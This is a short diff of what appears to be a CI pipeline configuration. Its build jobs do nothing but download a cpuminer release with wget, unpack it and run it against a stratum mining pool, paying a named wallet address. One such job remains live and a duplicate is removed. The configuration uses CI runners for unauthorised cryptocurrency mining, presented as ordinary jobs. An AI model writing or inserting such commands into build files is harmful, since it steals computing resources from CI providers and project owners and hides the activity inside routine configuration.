@@ -23,6 +23,3 @@ blocks:
         - name: 'Job #5'
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
-        - name: 'Job #6'
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
